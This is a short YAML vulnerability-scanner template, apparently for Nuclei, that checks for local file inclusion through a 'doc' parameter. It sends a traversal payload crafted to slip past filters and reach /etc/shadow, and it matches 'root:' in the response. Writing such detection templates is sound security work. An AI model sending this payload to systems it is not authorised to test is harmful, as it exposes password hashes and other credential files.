id: lfi3-057
name: 'Traversal to system file via doc'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via doc'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      doc:
        - '....//....//etc/shadow'
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
